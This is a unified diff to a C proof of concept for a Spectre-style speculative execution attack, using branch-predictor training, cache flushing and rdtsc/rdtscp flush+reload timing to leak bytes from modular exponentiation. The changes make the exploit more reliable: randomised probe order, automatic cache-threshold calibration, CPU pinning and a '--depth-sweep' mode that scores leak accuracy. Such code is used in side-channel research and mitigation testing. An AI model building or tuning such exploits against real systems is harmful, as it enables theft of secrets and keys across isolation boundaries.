@@ -14,8 +14,10 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <stdint.h>
 #include "portable/we_portable.h"
+#include "portable/we_cache_probe.h"
 #ifdef _MSC_VER
 #include <windows.h>
 #include <intrin.h> /* for rdtsc, rdtscp, clflush */
@@ -23,6 +25,8 @@
 #else
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #endif
+#include "portable/we_cache_timing.h"
+#include "portable/we_spectre_params.h"
 
 extern uint32_t fastmodexp(uint32_t base, uint32_t exp, uint32_t mod);
 extern uint32_t modexp(uint32_t base, uint32_t exp, uint32_t mod);
@@ -69,7 +73,7 @@ uint8_t array1[160] = {
   16
 };
 uint8_t unused2[64];
-uint8_t array2[256 * 512 * 4];
+uint8_t array2[256 * WE_PROBE_STRIDE * 4];
 
 //uint32_t sec[] = { 0x1c1c1c1c, 0x80880080, 0xc4c4c4c4, 0x4c4c4c4c };
 char* buf = "\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00";
@@ -103,21 +107,21 @@ void flush_memory_sse(uint8_t * addr)
 #endif
 
 #ifndef NOCLFLUSH
-#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
+#define TrainCall(Func) for (j = WE_TRAIN_CALLS - 1; j >= 0; j--) {\
 _mm_clflush(&array1_size);\
-for (volatile int z = 0; z < 100; z++) {}\
-x = ((j % 6) - 1) & ~0xFFFF;\
+for (volatile int z = 0; z < WE_TRAIN_DELAY_SPINS; z++) {}\
+x = ((j % WE_TRAIN_PERIOD) - 1) & ~0xFFFF;\
 x = (x | (x >> 16));\
 x = training_x ^ (x & (malicious_x ^ training_x));\
 Func(x, base);\
 }
 #else
-#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
+#define TrainCall(Func) for (j = WE_TRAIN_CALLS - 1; j >= 0; j--) {\
 for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {\
 	junk2 = cache_flush_array[l];\
 }\
-for (volatile int z = 0; z < 100; z++) {}\
-x = ((j % 6) - 1) & ~0xFFFF;\
+for (volatile int z = 0; z < WE_TRAIN_DELAY_SPINS; z++) {}\
+x = ((j % WE_TRAIN_PERIOD) - 1) & ~0xFFFF;\
 x = (x | (x >> 16));\
 x = training_x ^ (x & (malicious_x ^ training_x));\
 Func(x, base);\
@@ -146,6 +150,8 @@ void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[
 	uint8_t array1vals[4];
 	register uint64_t time1, time2;
 	volatile uint8_t * addr;
+	uint8_t probe_order[256];
+	uint32_t probe_state = (uint32_t)__rdtsc() | 1U;
 
 #ifdef NOCLFLUSH
 	int junk2 = 0;
@@ -157,13 +163,13 @@ void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[
 			results[i2][i] = 0;
 		}
 	}
-	for (tries = 999; tries > 0; tries--) {
+	for (tries = WE_MAX_TRIES; tries > 0; tries--) {
 
 #ifndef NOCLFLUSH
 		/* Flush array2[256*(0..255)] from cache */
 		for (i2 = 0; i2 < 4; i2++) {
 			for (i = 0; i < 256; i++) {
-				_mm_clflush(&array2[i2 * 512 * 256 + i * 512]); /* intrinsic for clflush instruction */
+				_mm_clflush(&array2[i2 * WE_PROBE_STRIDE * 256 + i * WE_PROBE_STRIDE]); /* intrinsic for clflush instruction */
 			}
 		}
 #else
@@ -172,7 +178,7 @@ void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[
 		for (j = 0; j < 16; j++)
 			for (i2 = 0; i2 < 4; i2++) {
 				for (i = 0; i < 256; i++) {
-					flush_memory_sse(&array2[i2 * 512 * 256 + i * 512]);
+					flush_memory_sse(&array2[i2 * WE_PROBE_STRIDE * 256 + i * WE_PROBE_STRIDE]);
 				}
 			}
 #endif
@@ -263,59 +269,36 @@ void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[
 		//*((uint32_t*)&array1vals) |= -(1 << (32 - nlz1(n)));		
 		uint8_t mask[4]; *((uint32_t*)&mask) = (1 << (32 - nlz1(_n))) - 1;
 
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
+		/* Shuffle each reload walk to avoid a learnable address stride. */
 		for (i2 = 3; i2 >= 0; i2--) {
+			we_shuffle_probe_order(probe_order, &probe_state);
 			for (i = 0; i < 256; i++) {
-				mix_i = ((i * 167) + 13) & 255;
-				addr = &array2[i2 * 512 * 256 + mix_i * 512];
-
-				/*
-				We need to accuratly measure the memory access to the current index of the
-				array so we can determine which index was cached by the malicious mispredicted code.
-
-				The best way to do this is to use the rdtscp instruction, which measures current
-				processor ticks, and is also serialized.
-				*/
+				mix_i = probe_order[i];
+				addr = &array2[i2 * WE_PROBE_STRIDE * 256 + mix_i * WE_PROBE_STRIDE];
 
 #ifndef NORDTSCP
-				time1 = __rdtscp(&junk); /* READ TIMER */
-				junk = *addr; /* MEMORY ACCESS TO TIME */
-				time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+				time1 = __rdtscp(&junk);
+				junk = *addr;
+				time2 = __rdtscp(&junk) - time1;
 #else
-
-				/*
-				The rdtscp instruction was instroduced with the x86-64 extensions.
-				Many older 32-bit processors won't support this, so we need to use
-				the equivalent but non-serialized tdtsc instruction instead.
-				*/
-
+#if defined(_MSC_VER) && defined(_M_IX86)
+				time2 = we_rdtsc_probe_x86(addr);
+#else
 #ifndef NOMFENCE
-				/*
-				Since the rdstc instruction isn't serialized, newer processors will try to
-				reorder it, ruining its value as a timing mechanism.
-				To get around this, we use the mfence instruction to introduce a memory
-				barrier and force serialization. mfence is used because it is portable across
-				Intel and AMD.
-				*/
-
-				_mm_mfence();
-				time1 = __rdtsc(); /* READ TIMER */
-				_mm_mfence();
-				junk = *addr; /* MEMORY ACCESS TO TIME */
-				_mm_mfence();
-				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-				_mm_mfence();
-#else
-				/*
-				The mfence instruction was introduced with the SSE2 instruction set, so
-				we have to ifdef it out on pre-SSE2 processors.
-				Luckily, these older processors don't seem to reorder the rdtsc instruction,
-				so not having mfence on older processors is less of an issue.
-				*/
-
-				time1 = __rdtsc(); /* READ TIMER */
-				junk = *addr; /* MEMORY ACCESS TO TIME */
-				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+				_mm_lfence();
+#endif
+				time1 = __rdtsc();
+#ifndef NOMFENCE
+				_mm_lfence();
+#endif
+				junk = *addr;
+#ifndef NOMFENCE
+				_mm_lfence();
+#endif
+				time2 = __rdtsc() - time1;
+#ifndef NOMFENCE
+				_mm_lfence();
+#endif
 #endif
 #endif
 				if (time2 <= cache_hit_threshold && ((mix_i & ~mask[i2]) == 0 && (mask[i2] == 0 || (uint8_t)(mix_i & mask[i2]) != array1vals[i2]))) //tries % array1_size])
@@ -353,6 +336,9 @@ void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[
 	}
 }
 
+#include "portable/we_probe_preflight.h"
+#include "portable/we_cpu_features.h"
+
 /*
 *  Command line arguments:
 *  1: Cache hit threshold (int)
@@ -361,9 +347,12 @@ void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[
 */
 int main(int argc,
 	const char * * argv) {
+	we_cpu_features cpu = we_detect_cpu_features();
+	if (!we_check_cpu_features(cpu)) return 2;
+	we_pin_cpu_from_env();
 
-	/* Default to a cache hit threshold of 80 */
-	int cache_hit_threshold = 80;
+	/* Calibrate by default; an explicit threshold remains available. */
+	int cache_hit_threshold = -1;
 
 	/* Default for malicious_x is the secret string address */
 	size_t malicious_x = 0;// (size_t)(secret - (char *)array1);
@@ -388,8 +377,24 @@ int main(int argc,
 	/* Parse the cache_hit_threshold from the first command line argument.
 	   (OPTIONAL) */
 	if (argc >= 2) {
-		sscanf(argv[1], "%d", &cache_hit_threshold);
+		if (strcmp(argv[1], "--depth-sweep") == 0) {
+			if (argc >= 3) sscanf(argv[2], "%d", &cache_hit_threshold);
+		} else {
+			sscanf(argv[1], "%d", &cache_hit_threshold);
+		}
 	}
+	if (cache_hit_threshold < 0) {
+		we_cache_calibration calibration = we_calibrate_cache_threshold(array2);
+		if (calibration.cold_p10 <= calibration.hot_p90) {
+			fprintf(stderr, "Cache timing calibration unavailable or hot/cold loads overlap; supply a measured threshold or use a CLFLUSH/RDTSCP build.\n");
+			return 2;
+		}
+		cache_hit_threshold = calibration.threshold;
+		printf("Cache timing: hot p90=%llu, cold p10=%llu cycles.\n",
+			(unsigned long long)calibration.hot_p90,
+			(unsigned long long)calibration.cold_p10);
+	}
+	if (!we_probe_preflight(array2, 4, cache_hit_threshold)) return 2;
 
 	/* Parse the malicious x address and length from the second and third
 	   command line argument. (OPTIONAL) */
@@ -418,9 +423,9 @@ int main(int argc,
 	printf("RDTSCP_NOT_SUPPORTED ");
 #endif
 #ifndef NOMFENCE
-	printf("MFENCE_SUPPORTED ");
+	printf("SSE2_TIMER_FENCES ");
 #else
-	printf("MFENCE_NOT_SUPPORTED ");
+	printf("NO_TIMER_FENCES ");
 #endif
 #ifndef NOCLFLUSH
 	printf("CLFLUSH_SUPPORTED ");
@@ -431,6 +436,35 @@ int main(int argc,
 	printf("\n");
 
 	printf("Reading %d bytes:\n", len);
+	if (argc >= 2 && strcmp(argv[1], "--depth-sweep") == 0) {
+		static const int modes[] = { 1, 2, 6, 8, 9 };
+		static const int depths[] = { 2, 4, 4, 5, 5 };
+		static const char *names[] = { "2 C", "4 C", "4 asm", "5 C", "5 asm" };
+		uint32_t base = ((uint32_t *)sec)[3];
+		int mode;
+		for (mode = 0; mode < 5; ++mode) {
+			int trial, correct = 0, confident = 0;
+			uint32_t expected = modexp(base, depths[mode], _n);
+			for (trial = 0; trial < 10; ++trial) {
+				uint32_t input = 1;
+				size_t target = (size_t)((char *)&input - (char *)array1);
+				uint8_t value[8];
+				int score[8];
+				uint32_t result;
+				readMemoryDword(cache_hit_threshold, target, value, score, base, modes[mode]);
+				result = value[0] | ((uint32_t)value[2] << 8) |
+					((uint32_t)value[4] << 16) | ((uint32_t)value[6] << 24);
+				if (result == expected) {
+					++correct;
+					if (score[0] >= 2 * score[1] && score[2] >= 2 * score[3] &&
+						score[4] >= 2 * score[5] && score[6] >= 2 * score[7]) ++confident;
+				}
+			}
+			printf("Depth %s: %d/10 correct, %d/10 confident (expected 0x%08X)\n",
+				names[mode], correct, confident, expected);
+		}
+		return 0;
+	}
 
 	//malicious_x = (size_t)((char*)buf - (char *)array1);
 
